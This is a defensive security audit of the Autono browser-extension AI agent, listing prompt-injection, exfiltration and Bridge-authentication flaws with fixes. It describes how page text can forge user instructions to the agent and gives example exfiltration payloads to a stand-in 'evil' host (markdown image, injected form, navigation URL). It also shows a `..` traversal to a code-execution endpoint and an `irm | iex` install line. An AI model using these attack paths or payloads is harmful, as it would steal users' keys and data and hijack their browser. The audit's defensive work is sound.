# Autono: full-repo security audit (consolidated)

- Date: 2026-10-11
- Commit: `e736be5` (branch `claude/security-review-81f554`, clean tree)
- Scope: the `Autono` extension (background worker, content scripts, side panel, options, lib, build scripts). The local "Antigravity Bridge" is NOT in this repo and was not reviewed.
- Method: static review by four parallel agents (prompt injection / agent loop; messaging and page boundary; side-panel injection; bridge / network / secrets). Nothing was executed in a browser and no network requests were made. I re-read the code for every item marked **[verified]**; the rest are the agents' code traces.
- All five slices have reported. The fifth (manifest / permissions / build / supply chain / dictation models / "updates" feature) is in section 6.

## 0. Bottom line

The threat you described is real and, in the current code, has several independent paths. A malicious page can reach the user's browser sessions and (through the Bridge) the user's computer without the user ever approving an action, because:

1. Nothing separates website text from the user's instructions in any prompt.
2. In Cowork mode no browser action ever asks for approval, and the "Supervision Level" setting is not wired to anything.
3. The extension never checks where the agent navigates (any origin, `file:`, `data:`, localhost, LAN).
4. Two in-page UI surfaces (instruction box, mascot) can be driven by page JavaScript and are accepted by the background with no sender check.
5. Model output is rendered as raw HTML in the privileged side panel with a CSP that does not restrict images, forms or styles, so a page can steer the model into leaking data with zero clicks.
6. The Bridge channel has no authentication in either direction, and API keys, page content and "run this code" requests go to whatever answers on the configured port.

None of this needs a browser exploit. The attacker only needs the user to open a page while Autono is active.

## 1. Priority table

| ID | Sev | Title | Where | Needs |
|---|---|---|---|---|
| A1 | Critical | Page can forge "URGENT USER INSTRUCTIONS" to the Cowork agent | `content/content.js:199-256`, `background.js:974,3004,4634` | page JS only |
| A2 | Critical | Page can drive the mascot: chat as the user, read another tab's content and chat history | `content/mascot.js:113,150,390`, `background.js:4466,4536,4583` | page JS only |
| A3 | Critical | Raw model HTML rendered in side panel, unrestricted CSP: zero-click exfiltration, UI overlay, persistent | `sidepanel.js:11-14,9548`, `manifest.json:73` | prompt injection |
| A4 | Critical | No instruction/data boundary; hidden text included | `background.js:3008-3032,2425-2440`, `domExtractor.js:154-157` | page content |
| A5 | High | Cowork has no human-in-the-loop; Supervision Level is a dead control | `background.js:3066-3119`, `index.html:722` | none |
| A6 | High | No scope containment or sensitive-action guard | `background.js` (loop), `executeTypeAction` | injection |
| A7 | High | Navigation targets unvalidated (exfil URL, localhost/Bridge, LAN, `file:`) | `background.js:3078,2271,2229,1514` | injection |
| A8 | High | `cowork_request` approval card hides the goal; option 0 = yes | `sidepanel.js:8387-8394,9424` | one click |
| A9 | High | One click runs model-written code on the host via Bridge | `sidepanel.js:8795,8723` | one click |
| A10 | High | Unauthenticated remote-control poller (MCP toggle) | `background.js:3836-3860,3887-4048` | toggle on + local listener |
| A11 | High | All provider API keys, page content, screenshots sent to whatever is at `bridgeUrl` | `options.js:148`, `sidepanel.js:6692`, `background.js:505` | local listener |
| A12 | High | No sender validation anywhere; port hands out keys and history; storage readable from content scripts | `background.js:4163,4434` | renderer compromise |
| A13 | High | `bridge_relay` path allowlist bypass (`..`) reaches any Bridge endpoint | `background.js:4497-4509` | A12 |
| A14 | High | API keys copied into injected markup (`data-mirror`) then submitted by injected form | `sidepanel.js:6508-6524` | A3 |
| A15 | Medium | DOM clobbering of settings read by id at save time | `sidepanel.js:6652-6662` | A3 |
| A16 | Medium | Sub-agent permission card under-discloses; "don't ask again" is global and permanent | `sidepanel.js:9303,9312` | injection |
| A17 | Medium | Sub-agent / tool output re-enters prompts as instructions | `background.js:2673,3023,3142` | injection |
| A18 | Medium | Search results, attachments, page selection placed inside the GOAL | `sidepanel.js:4212-4284` | attacker SEO / page |
| A19 | Medium | Kill switch weaknesses (pause in page DOM, in-flight typing, cancelled task still fires power action) | `background.js:997,2947,3267,3329` | none |
| A20 | Medium | Bridge/MCP/provider URLs unvalidated; plaintext HTTP to non-loopback allowed | `options.js:112`, `background.js:3839` | user or A12 |
| A21 | Medium | Self-update through unauthenticated Bridge endpoints | `sidepanel.js:7859` | Bridge |
| A22 | Medium | Every prompt of 8+ chars goes to TinyFish with no switch | `sidepanel.js:114,4212`, `lib/tinyfish.js:70` | none (privacy) |
| A23 | Medium | `file:`/`data:` not restricted; no incognito handling | `background.js:1514`, `manifest.json` | injection |
| A24 | Medium | Download PDF / DOCX build extension-origin HTML from raw model content | `sidepanel.js:8577-8646` | one click |
| M1 | High | Self-update pulls mutable GitHub `main`, no signature/hash (expands A21) | `sidepanel.js:7779,7859`, README install | repo/Bridge compromise |
| M2 | Medium | Static content scripts + capture-phase hotkeys on every page | `manifest.json:38-50`, `content.js:527-593` | none |
| M3 | Medium | Unused/over-broad permissions (`webNavigation`, `notifications`, `tabs`, static `<all_urls>`) | `manifest.json` | none |
| M4 | Medium | CSP missing fetch/navigation directives (same root as A3) | `manifest.json:73` | A3 |
| M5 | Medium | No privacy policy / consent; README contradicts behaviour | repo-wide | none |
| M6 | Medium | Store remote-code, single-purpose, trademark risks | `sidepanel.js:8705`, assets | none |
| M7 | Medium | No CI/tests; `check-csp.js` enforces nothing | `scripts/`, `.github` | none |
| A25 | Low | Misc (see section 5) and M8 to M13 (section 6) | | |

## 2. Findings in detail

### A1. Forged user instructions via the in-page overlay (Critical) [verified]
- The overlay input `#__antigravity_inline_input` is in the page's light DOM (`content/content.js:199-201`). `sendIntervention()` sends `{type:'user_intervention', text}` on button click or Enter; neither handler checks `isTrusted` (the hotkeys at `:531,598` do).
- `background.js:4634` accepts it from any sender, pushes to `pendingInterventions` (`:974`), and `:3004` injects it as "URGENT USER INSTRUCTIONS (Direct real-time intervention) ... You must prioritize these instructions".
- Attack: page script sets the input value and dispatches Enter. The agent treats attacker text as the user's own priority command and has navigate/click/type on every origin. The same script can click the pause button to undo a user pause and delete the overlay so the user cannot see the tab is being driven.
- Fix:
  1. Remove the text box from the page; interventions only from the side panel.
  2. In `onMessage`, reject `user_intervention`, `resume_cowork_task` and `AGENT_WORK_PAUSED{paused:false}` whenever `sender.tab` is set (see A12 helper).
  3. Build the banner in a closed shadow root and require `e.isTrusted` on pause/stop.

### A2. Mascot driven by any page (Critical) [verified]
- `content/mascot.js:113` uses `attachShadow({mode:'open'})`; send click/Enter have no `isTrusted` check. In done/error state the message is `mascot_followup` (`:390`), otherwise `mascot_btw`.
- `background.js:4536` (`mascot_followup`) has no sender check. It appends the attacker text to the user's persistent session, re-extracts the DOM of `mascot.session.tabId` (the tab of the last task, a different origin), adds the last 10 chat messages, calls the model with the user's key, and returns the answer to the calling tab's shadow DOM, where the page reads it.
- Gains: cross-origin read of the last task's tab and chat history, free model calls on the user's quota, attacker text stored as a user message, `/teamwork` prefix enables multi-agent.
- Fix: delete in-page chat (mascot click opens the side panel). If kept: closed shadow root + `isTrusted`; background requires `sender.tab.active`, `frameId===0`, uses only `sender.tab.id` as context, no session history, never writes to the user's session, rate-limited; `mascot_ready` returns state only to the tab the background pushed to; show a fixed string instead of `mascot_note`/error text on other origins. Closed shadow + `isTrusted` is not a full boundary (page can capture keystrokes); the robust design is an extension-origin iframe or no text entry in the page.

### A3. Raw HTML in the side panel + missing CSP directives (Critical) [verified]
- `marked.setOptions({gfm:true, breaks:true})` only (`sidepanel.js:11-14`); `marked.parse` output goes to `innerHTML` (`:9548`, sinks `:1003,1022,1054,1076,1096,1134,1141,4620`). marked v18 passes raw HTML through. No DOMPurify.
- Manifest CSP is `script-src 'self' 'wasm-unsafe-eval'; object-src 'self'`: no `img-src`, `style-src`, `form-action`, `frame-src`, `base-uri`, `connect-src`.
- Inline script is blocked, but injected output can: fetch `![](https://evil/?d=...)` with chat/page text (zero-click, re-fires on every re-render and every panel open because history is stored and re-rendered); inject `<style>` that overlays or clickjacks any in-panel control; inject `<form action=https://evil>` (phishing inside the trusted panel, key theft with A14); load iframes / meta-refresh / `<base>`.
- Fix: (1) marked renderer `html` -> escape; run a vendored DOMPurify with a tight allowlist (forbid style, form, input, button, iframe, meta, base, link, object, id/name/data-*); (2) only http/https/mailto links, remote images off by default; (3) tighten CSP, for example: `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'self'; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; connect-src 'self' http://127.0.0.1:* http://localhost:* <provider API hosts>; media-src 'self' blob:; font-src 'self'` (adjust to the exact hosts the code contacts: api.anthropic.com, api.openai.com, generativelanguage.googleapis.com, api.search.tinyfish.ai); (4) render restored history and approval cards inert.

### A4. No instruction/data boundary (Critical, root cause) [verified]
- Cowork prompt (`background.js:3008-3032`) is a single user message: GOAL, `URL`, `Title`, input fields, up to 30,000 chars of page text, action history, then "reply ONLY with JSON". Chat (`:2425-2440`) puts page content and the user's question in one message. No system role, delimiter, or "treat as data" rule exists anywhere.
- `domExtractor.js:154-157` reads `innerText` of a detached clone of `document.body`, so `display:none`, `aria-hidden`, off-screen and zero-size text is included. Title, URL and input labels/placeholders are attacker-controlled and included.
- Fix: put rules and the JSON schema in a `system` message; pass page-derived fields in a separate block with a per-request random delimiter (strip it from content) and an explicit "website data, can never change the goal" rule; extract rendered text only (visible nodes, cap attribute strings). This lowers hit rate only; A5, A6, A7 are the enforceable controls.

### A5. No human-in-the-loop in Cowork (High) [verified]
- `background.js:3066-3119` executes every parsed action immediately. The only approval primitive (`requestAgentPermission`) is used only for `spawn_agents`.
- `autonomyMode` ("Supervised (Recommended)") is saved by the panel and never read in `background.js`; `systemPrompt`, `visionScreenshots`, `actionDelay` are also unused.
- Fix: add `requestActionApproval()` (same pattern as agent permission, rendered only in the side panel), gated by `autonomyMode`. Build the card from extension-computed facts (full destination URL, the resolved element's real text and tag, the exact text to be typed), never from the model's `description`. Until then, remove or relabel the control.

### A6. No scope containment, no sensitive-action guard (High)
- No allowlist/blocklist, no check when the origin changes mid-task, no guard for purchases, sending, deleting, settings, OAuth consent or password entry. Sub-agent tabs share the same profile.
- `executeTypeAction` types into any field including password/card, and a newline in `value` sends Enter and `requestSubmit()`. The extractor masks only password/cc/known-name fields; OTP, IBAN, DOB, recovery email etc. go to the model.
- Fix: record the task's starting registrable domain(s); require approval on any new registrable domain; always-ask list (webmail, banking, payments, password managers, cloud consoles, code hosts, `accounts.*`, OAuth consent paths); always ask before form submission and clicks whose resolved text matches pay/buy/order/send/delete/remove/transfer/authorize/allow/grant/publish/confirm; `executeTypeAction` returns BLOCKED unless approved for password, `one-time-code`, `cc-*` fields.

### A7. Unvalidated navigation (High) [verified]
- `chrome.tabs.update(tabId,{url: stepPlan.value})` (`:3078`), `:2271`, and `tabs.create` at `:2229`. `isRestrictedUrl` (`:1514`) covers only browser-internal schemes; probes returned "not restricted" for `javascript:`, `data:`, `file:///`, `blob:`, `ftp:`, `http://127.0.0.1:8765/...`, `http://192.168.1.1/admin`.
- Exfiltration primitive: `navigate` to `https://evil/c?d=<anything in the prompt>`, no user interaction. Local reach: the agent can open the Bridge UI, router/NAS pages, intranet hosts (with the user's cookies) and read them back through the next step's page text.
- Fix: `validateAgentUrl()` at all three sinks: parse with `URL`; only `http:`/`https:`; no embedded credentials; block localhost, `*.local`, 127/8, ::1, 10/8, 172.16/12, 192.168/16, 169.254/16, fc00::/7 and the configured Bridge/MCP origins unless the user confirms; length cap; route new registrable domains through A6 approval showing the full URL; try/catch the `tabs.update`. Add `file:`, `data:`, `blob:`, `javascript:`, `filesystem:` to `isRestrictedUrl`.

### A8. `cowork_request` approval card (High) [verified]
- `sidepanel.js:8387-8394`: `isAffirmative = picked.includes(0) || customText.includes('yes'|'sí'|'si'|'start'|'enable')`. The card shows only the model's question and options; `cardData.goal` is never rendered; radio options auto-submit after 480 ms. A model-authored card with "No thanks" as option 0 starts Cowork with an attacker goal. Typing "decision" or "not on this site" also starts it. Cards re-arm when a session is reopened.
- Fix: for `cowork_request`, ignore model-supplied questions; render a fixed extension-authored card showing the full goal (via `textContent`) and current origin with two fixed buttons; no auto-submit; no substring matching; historical cards inert.

### A9. One-click code execution on the host (High) [verified]
- Any fenced block tagged py/python/js/html/svg/sh/bash gets an "Ejecutar" button (`sidepanel.js:8795`) that POSTs `{code, language}` to `${bridgeUrl}/api/code/execute` (`:8723`) with no confirmation, no auth, and without showing what runs. With A3 an injected `<style>` can make the first click anywhere trigger it.
- Fix: remove, or gate behind an off-by-default setting plus a per-run native confirmation showing language and full code; disable Run for turns that included page/search content. Bridge must require a per-install secret and sandbox execution. Also remove the dead `new Function('console', content)` at `:8705` (it throws under the current CSP and would become live if `unsafe-eval` were ever added).

### A10. Unauthenticated remote-control poller (High) [verified]
- When "Activar puente MCP" is on (default off), the worker long-polls `GET {origin(localMcpUrl)}/api/mcp/pending_actions` with no headers and executes `navigate`, `click`, `type`, `screenshot`, `get_active_tab`, `browser_task` with no approval or overlay, POSTing page text (5000 chars) and PNGs back. Any host is accepted; retries forever; restarts on boot, every minute and on any storage change.
- Attack: Bridge not running -> any local process (other OS user, malware, stale dev server) binds 127.0.0.1:8765 and drives the logged-in browser. With a LAN/internet `localMcpUrl` (user or A12), a network attacker can inject actions over plain http.
- Fix: loopback only; per-install pairing token on poll and result; persistent on-page indicator + notification for externally originated actions; confirmation for navigate/type/click/screenshot/browser_task or per-origin allowlist; stop after N failures; never start from a storage event; remove the full-action `console.log` (`:3858`).

### A11. Secrets and data to an unverified Bridge (High) [verified]
- Every settings save POSTs all three provider keys to `${bridgeUrl}/api/config` (`options.js:148`, `sidepanel.js:6692`), even in all-API mode. Bridge-routed inference adds key headers (`background.js:505-512`). Prompts, page content (30,000 chars/step), screenshots, mic audio and TTS text follow `bridgeUrl`. The only "credential" is the public constant `Bearer sk-antigravity`. A server on that port also supplies the "model" replies that Cowork executes.
- Fix: do not send provider keys to the Bridge unless the user opts in per provider (CLI mode is already signed in); verify the Bridge with a pairing token/challenge before sending anything sensitive; restrict `bridgeUrl` to loopback (A20).

### A12. No sender validation; storage readable from content scripts (High) [verified]
- `onConnect` checks only `port.name === 'antigravity-panel'`, then sends `init_state` with settings (all API keys) and all sessions. The port accepts `save_settings` (bridge URL, keys, `agentConfirm`, MCP URL/enable), `start_cowork`, `agent_permission_response`, `update_session`. No `sender.id/url/origin/frameId` check exists on any handler. No `setAccessLevel` call, so `chrome.storage.local` (keys, history) is readable and writable from content-script contexts. Needs a compromised renderer on any site (content scripts run everywhere), not plain page JS.
- Fix:
  ```js
  const EXT_ORIGIN = new URL(chrome.runtime.getURL('')).origin;
  const isExtPage = (s) => !!s && s.id === chrome.runtime.id && typeof s.url === 'string' && s.url.startsWith(EXT_ORIGIN + '/');
  ```
  In `onConnect`: disconnect unless `isExtPage(port.sender)`. In `onMessage`: two allowlists. Content-script types (require `sender.tab && frameId===0`): `CHECK_ACTIVE_TASK`, `mascot_ready`, `mascot_dismiss`, `mascot_pin/unpin`, `open/close_side_panel`, picker messages; pause/cancel only from `runningTask.tabId`. Everything else (`quick_inference`, `bridge_relay`, `mascot_*` chat, `user_intervention`, `resume_cowork_task`, ...) requires `isExtPage`. At worker start: `chrome.storage.local.setAccessLevel({accessLevel:'TRUSTED_CONTEXTS'})`. Validate `saveSettings`. Stop sending API keys wholesale in `init_state`. Drop the `localStorage` copies of keys.

### A13. `bridge_relay` traversal (High) [verified]
- `if (!path.startsWith('/v1/stt/')) throw ...; fetch(base + path, init)` with sender-chosen method/body and the response returned. `/v1/stt/../../api/code/execute` normalises to `/api/code/execute`; `/v1/stt/../../api/power/shutdown` likewise.
- Fix: require `isExtPage`; `new URL(path, base+'/')`, assert same origin and `pathname` exactly `/v1/stt/status` or `/v1/stt/transcribe`; fix the method per path; cap body size.

### A14. API-key theft via `data-mirror` (High) [verified]
- `syncUserPrefs()` (`sidepanel.js:6508`) does `document.querySelectorAll('[data-mirror]')` and `mirror.value = src.value` from `document.getElementById(mirror.dataset.mirror)`. Model-injected `<input data-mirror=settingGeminiApiKey>` (+ Anthropic/OpenAI/TinyFish) inside an injected `<form action=https://evil>` receives the keys when Settings opens; one click submits them.
- Fix: bind mirrors from a static id list in script, scoped to `settingsModal`; `form-action 'none'`; A3.

### A15. DOM clobbering of settings (Medium) [verified]
- `saveAllSettings` reads `document.getElementById('settingAgentConfirm'|'settingLocalMcpBridgeEnabled'|'settingMultiAgent'|'settingShadowOnComplete')` at save time; `#messagesContainer` precedes `#settingsModal` in `index.html`. Injected inputs with those ids win the lookup: next Save turns off agent confirmation, turns on multi-agent and the remote-control poller, and can set `shadowOnComplete` to shutdown.
- Fix: cache element references at startup or scope to `settingsModal.querySelector`; sanitiser strips `id`/`name`.

### A16 to A24 (Medium)
- **A16 Sub-agent permission card:** `url` and `role` are never shown; `task` truncated to 220 chars (real limit 8000). "Allow and don't ask again" sets `agentConfirm=false` globally and permanently. One approval covers up to 50 agents, 5 tabs, 15 steps, any origin. Fix: show origin + full URL + full task; "for this task only"; apply A6/A7 per agent; count nested helpers against an approved budget.
- **A17 Tool output as instructions:** sub-agent results are pushed as `role:user` (`:2673`); action results embed uncapped page strings (`label = placeholder||name||id`, `:3783`) and are replayed every step, and a result containing "error"/"fail" is quoted inside an "ADAPTIVE GUIDANCE ... STRICT RESILIENCE RULE" block (`:3142`). Fix: cap and JSON-encode page-derived fragments (<=60 chars, no newlines); structured results; wrap in the untrusted block; narrower authority for sub-agents.
- **A18 GOAL pollution:** TinyFish results (title/snippet verbatim), attached files/tabs/fragments and page-set `selectedText` are concatenated into the string sent as `goalText`, i.e. into `GOAL: "..."` (the most trusted position). Fix: keep typed text as the only goal; send context as separate untrusted fields; no web search on model-authored text.
- **A19 Kill switch:** pause exists only in the page DOM; pause/cancel do not interrupt an in-flight model call or the injected typing loop (~75 ms/char then Enter + submit); a cancelled task can fall through to report generation, broadcast `task_complete` and fire the sleep power action; `runningTask` is a single global that a second task (MCP `browser_task`, `mascot_followup` while paused) overwrites, leaving the first loop uncancellable. Closing the panel does not stop a task. Fix: check abort/paused immediately before every action and after the model call; cancel flag polled by the typing function; rethrow AbortError in the report path; refuse a second task or key tasks by id; Pause/Stop in the side panel; clamp `maxSteps` (default 30, HTML allows 100, sub-agents 15 x 50).
- **A20 URL validation:** `bridgeUrl`, `localMcpUrl` (a scheme-less value is prefixed `http://`) and external-provider `baseUrl` accept any host and plaintext http. Fix: parse with `URL`; http only for loopback, https otherwise with a warning; `redirect:'error'` on credentialed fetches.
- **A21 Self-update:** panel POSTs `{ext_id, ext_path}` to `/v1/update/extension` then `chrome.runtime.reload()`; status is checked with `force=true` on every panel open; whoever answers at `bridgeUrl` controls the "update available" banner. No signature/tag/hash on the extension side. Fix: signed tagged releases with hash shown; Bridge derives the path itself; token required.
- **A22 TinyFish always on:** `const isSearchActive = true` (`sidepanel.js:114`); every prompt of 8+ chars (not starting with `/`) is sent in a GET query string, with or without a key. README says chats go only to the chosen provider. Fix: off by default with a toggle and notice; POST; strip attachments/selections.
- **A23 `file:`/incognito:** covered by A7 fix; also set `"incognito": "not_allowed"` or skip persistence and require confirmation when `tab.incognito`.
- **A24 PDF/DOCX export:** `marked.parse(content)` or raw `content` goes into a blob HTML document opened in a tab at `blob:chrome-extension://...` with no meta CSP (`sidepanel.js:8577-8603`; DOCX `:8621-8646`). Script is expected to be blocked by inherited CSP (not runtime-tested) but the page is same-origin with the extension. Fix: sanitise with the A3 sanitiser; add a meta CSP `default-src 'none'; style-src 'unsafe-inline'` as the table viewer does; revoke blob URLs.

## 3. Defences already present (do not re-recommend)

- No `eval`/`new Function`/`world:'MAIN'` in background, content scripts or extractors; every `executeScript` uses static `files` or fixed `func` with data-only `args`, top frame, isolated world.
- No `externally_connectable`, `onMessageExternal`, `onConnectExternal`; no `window.postMessage` channel.
- Extension-page CSP blocks inline script and `javascript:`; no inline handlers (`scripts/check-csp.js` only checks that).
- `isRestrictedUrl` gates extraction and click/type/scroll on `chrome://`, `chrome-extension://`, `edge://`, `about:`, `view-source:`, `devtools://`, Web Store; Cowork refuses to start there.
- Sub-agent spawning needs approval by default (denied after 5 min), multi-agent is off by default, agent `url` must be http(s), 50 agents / 4 concurrent / 5 tabs / depth 2 / 3 rounds / 600 s.
- Extractor masks password / `cc-` / known-name inputs as `[PROTECTED_INPUT]` and omits hidden inputs; strips script/style/noscript/svg/iframe.
- MCP poller off by default; MCP `navigate` forces http(s).
- Content-script hotkeys check `isTrusted`; dynamic text in content scripts uses `textContent`.
- HTML artifact preview is `<iframe sandbox="allow-scripts">` without `allow-same-origin`; KaTeX is used without `trust`; table full-view uses a sanitiser plus meta CSP.
- Options and mic-permission pages: no `innerHTML`, no query/hash use, not web-accessible.
- No secrets in git history (33 commits scanned; only placeholders). `.env.example` values are not read by shipped code.
- API keys are never put in URLs, console output or prompts.

## 4. Fix order (suggested roadmap)

**Sprint 1: close the no-click, page-only paths**
1. A1: remove the in-page instruction box; reject `user_intervention` etc. from tab senders.
2. A2: remove or lock down mascot chat (sender checks, no cross-tab context, no session writes).
3. A12 + A13: `isExtPage` gate on port and `onMessage`; `setAccessLevel`; fix `bridge_relay`.
4. A3: sanitiser + marked `html` override + CSP tightening; A14 and A15 fall out of this plus the small fixes noted.

**Sprint 2: put a human back in the loop**
5. A7: `validateAgentUrl()` at the three navigation sinks; extend `isRestrictedUrl`.
6. A5 + A6: `requestActionApproval()`, origin tracking, sensitive-field guard, wire `autonomyMode`.
7. A8: fixed `cowork_request` card. A16: honest sub-agent card, no global "don't ask again".
8. A9: gate or remove code execution; remove `new Function`.

**Sprint 3: bridge trust and prompt structure**
9. A10 + A11 + A20: pairing token, loopback-only, keys only on opt-in, `Authorization` on every Bridge call (coordinate with the Bridge repo).
10. A4 + A17 + A18: system/data separation with random delimiter; structured action results; context as separate untrusted fields.
11. A19: abort/pause correctness; A22: search toggle; A21: signed updates; A24: export sanitising.

**Bridge repo must also (cannot be verified from here):** per-install bearer token on every route including GET long-poll and `/mcp/sse`; reject requests whose `Origin` is a web origin; require `Host` to be `127.0.0.1:<port>`/`localhost:<port>` (DNS rebinding); accept JSON only with `application/json`; no wildcard/reflected CORS; exclusive loopback bind; sandbox or drop `/api/code/execute`; token on `/api/power/*`; unguessable `action_id`s.

## 5. Low-severity items

- Default `shadowEnabled:true` + `shadowOnComplete:'sleep'`: every completed task asks the Bridge to sleep the PC (`background.js:66-69`). Default to `none`.
- Web-accessible resources `assets/*`, `domExtractor.js`, `buildDomTree.js` for `<all_urls>`: only `assets/mascot/*.gif` is needed; `buildDomTree.js` is injected but never invoked (dead weight on every agent page).
- `data-highlight-index` / `data-index` attribute selectors share the page namespace; resolve indices only through the isolated-world map; skip extension UI elements. Fuzzy element matching (substring, `activeElement` fallback) can redirect clicks/typing; model sees buttons as `[object Object]` because the extractor returns objects joined as strings.
- Unescaped sinks: `:2026` (`effortLabel` from Bridge `/v1/models`, persisted in `localStorage`), `:3074` (`size_mb`), `:8260` (`q.type` as class), `:8687` (SVG preview `innerHTML`), favicon `<img src>` built from TinyFish `site_name` (`:4224`, `:9045`, `:9063`).
- Links have no scheme allowlist or click interception (`:910`, `:1191`, `:4241`, `:9062`).
- Dead/unauthenticated handlers: `mascot_summon`, `mascot_test`, `zylo_group_tabs`, `antigravity_ask_selection`, `ensure_usable_tab`, the side-panel `onMessage` listener (`:9716`); context-menu broadcast has no receiver.
- Microphone stream not stopped on an error path (`:3530-3603`); silent fallback to `webkitSpeechRecognition` (audio to browser vendor); blob URLs not revoked.
- `console.log` of full MCP actions including typed text (`:3858`); `tf_demo_key` constant in dead code (`lib/tinyfish.js:38`).
- `notifications` and `webNavigation` permissions have no listeners/uses found by the agents; `activeTab` is redundant with `<all_urls>`.
- Google favicon service receives every cited domain.
- `scripts/build-dist.js` copies `components/ui/*.tsx`, `package.json`, lockfile and README into `dist` (inert but unnecessary).

## 6. Manifest, build and supply chain

Source: fifth agent; it also hash-compared the vendored files against the public npm tarballs. Not executed in Chrome; all CSP/permission proposals are untested.

### M1. Self-update from the moving GitHub head, no integrity check (High; store-policy blocker)
- `sidepanel.js:7779` (status check on every panel open, `:7904`), `:7859-7865` (`/v1/update/extension` then `chrome.runtime.reload()`), one-click banner `index.html:15-19`. The Bridge (other repo) fetches whatever is current on GitHub `main`, overwrites the unpacked folder, and the extension reloads with `<all_urls>`, `scripting`, `tabs` and the stored API keys. Repo has 0 tags, unsigned commits, no CI, no review gate. The README install is `irm https://raw.githubusercontent.com/.../ModelBridge/main/install.ps1 | iex`.
- Risk: a compromised GitHub account, a bad merge or a compromised Bridge reaches every user after one click. A Web Store build cannot self-modify (remote-code policy).
- Fix: Web Store distribution with the updater hidden when `update_url` is present; for sideload, tagged releases + SHA-256 manifest + detached signature (minisign/cosign), Bridge pins the public key, verifies before writing, rejects downgrades, shows version/hash for confirmation; branch protection, 2FA, signed tags; pinned release URL + hash instead of `irm | iex`; Bridge authenticates `/v1/update/*` and validates `ext_path` holds an Autono `manifest.json`.

### M2. Static content scripts on every page (Medium)
- `manifest.json:38-50`: `http://*/*`, `https://*/*`, `<all_urls>` (redundant; also covers `file://` if enabled), `content.js` + `mascot.js` at `document_idle`, top frame only. At load: capture-phase `keydown/keyup` hotkeys on every page (the 0/9 chord calls `preventDefault` even inside inputs, so fast typing of "90"/"09" in an OTP/phone/card field can drop a digit and toggle the panel; keystrokes are not transmitted), two service-worker wake-ups per navigation, a console log.
- On-demand injection already exists (`background.js:1365`, `sidepanel.js:3993`). Fix: delete the `content_scripts` block, add `files:['content/content.js']` to the task-tab re-injection (`background.js:858-873`), remove the chord handlers in favour of `commands`, add `file:` to `isRestrictedUrl`.

### M3. Permissions broader than needed (Medium)
| Permission / host | Verdict |
|---|---|
| storage, scripting, sidePanel, alarms, contextMenus | Keep |
| activeTab | Keep (becomes primary grant once hosts are narrowed; verify the action click that opens the panel grants it) |
| tabs | Remove (redundant with host access; `isRestrictedUrl(undefined)` already fails closed) |
| webNavigation | Remove (no listeners/uses) |
| notifications | Remove (never used) |
| unlimitedStorage | Remove and add a retention cap, or justify (history incl. page text grows without bound; no delete-all) |
| tabGroups, power | Keep or make optional; limit keep-awake to while a task runs (currently requested at worker start) |
| `<all_urls>` host | Move to `optional_host_permissions`, request per site / "all sites" at runtime; screenshots need it or an activeTab grant |
| localhost entries | Redundant with `<all_urls>`; keep once `<all_urls>` is optional |
| missing | add the four provider hosts explicitly (googleapis, anthropic, openai, tinyfish) |

### M4. Extension-page CSP lacks fetch/navigation directives (Medium)
Same root as A3. Proposed (compatible with custom providers):
```
default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; worker-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'; frame-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data: blob: https://www.google.com https://*.gstatic.com; media-src 'self' blob:; connect-src 'self' http://127.0.0.1:* http://localhost:* https:
```
Stricter later: replace `https:` with the enumerated API hosts (custom providers/MCP via runtime `permissions.request`), `style-src-elem 'self'; style-src-attr 'unsafe-inline'` once inline `<style>` blocks (`mic-permission.html:7`, `sidepanel.js:8583,8635,9655`) move to packaged CSS, drop favicon hosts. Test that `frame-src` still allows the sandboxed `srcdoc` preview. This does not replace a sanitiser. COEP `require-corp`/COOP `same-origin` exist for Whisper WASM threads; they block reading cross-origin responses, not sending the request, so they do not mitigate exfiltration.

### M5. Third-party prompts and privacy disclosure (Medium)
- TinyFish always on (see A22); README says "No Autono server in the middle ... chats stay on your computer" (`README.md:65,370`), contradicted by `sidepanel.js:114,4212`.
- No privacy policy anywhere; onboarding (`sidepanel.js:7057-7061`) has no consent screen. Data handled: page URL/title/30k chars/form values, screenshots, microphone audio (silent fallback to the browser's Google recogniser, toast only; README claims "nothing leaves your computer"), API keys POSTed to the Bridge on every save, chat history kept indefinitely, prompts to TinyFish, cited domains to Google favicons.
- Fix: PRIVACY.md (inventory, recipients, retention, deletion), first-run consent naming each recipient, ask before cloud speech fallback, "Delete all data" and a retention setting, correct the README.

### M6. Store remote-code / single-purpose risks (Medium)
- `new Function('console', content)` at `sidepanel.js:8705` (dead under the CSP but flagged by static review): remove or move to a manifest `sandbox` page.
- MCP poller reads as remote-command interpretation (off by default): document it.
- Single purpose: PC sleep/shutdown, host code execution, TTS and external-agent bridging are bundled with the browser agent.
- Third-party logos and names (`assets/claude-*`, `chatgpt-*`, `codex-logo.svg`, `document.title = 'Claude - Autono'`) create impersonation/trademark exposure.

### M7. No CI, tests or enforcing checks (Medium)
- No `.github/workflows`; `scripts/check-csp.js` always ends with "Check complete.", only matches quoted inline handlers, misses `content/*`, `options.js`, `mic-permission`, did not catch `new Function`, uses wrong/foreign paths (`../dist/side-panel/...`, `../../Zylo Browser Agent/...`) and is not in `package.json` scripts. Because M1 ships `main`, nothing stands between a bad commit and users.
- Fix: PR CI with manifest lint, CSP/dynamic-code scan that fails on `new Function`/`eval`/remote src/unsanitised `innerHTML`, vendored-hash verification (hashes below), gitleaks, `npm ci --ignore-scripts`, a Playwright extension smoke test.

### M8 to M13 (Low)
- **Build script:** `scripts/build-dist.js:10-23` copies the whole working directory except `node_modules/.git/dist/scripts`, never cleans dist, ignores `.gitignore`, emits no zip/hash. Ships inert `components/**/*.tsx`, `package.json`, lockfile, stale `Autono/README.md`; would ship any local `.env*`, `.pem`, `.key`, logs. Build from `git ls-files` or an allowlist, clean first, emit zip + `SHA256SUMS`, fail on `.env/.pem/.map/.tsx/node_modules`. Delete the stale `translate-background*.js` scripts (local string replacements, no network).
- **Dependencies:** no runtime npm dependency is imported by shipped code (marked/katex are vendored copies); `ai`, `@tiny-fish/sdk`, react, radix, framer-motion, `@base-ui`, lucide are used only by demo TSX; `"dev": "vite"` refers to a package not installed; `lib/tinyfish.js:36` bare `import('@tiny-fish/sdk')` never resolves. Lockfile is clean (v3, 123 packages, registry-only, sha512 integrity, 0 install scripts, 0 git deps). Remove the demo components and unused deps; use `npm ci --ignore-scripts`.
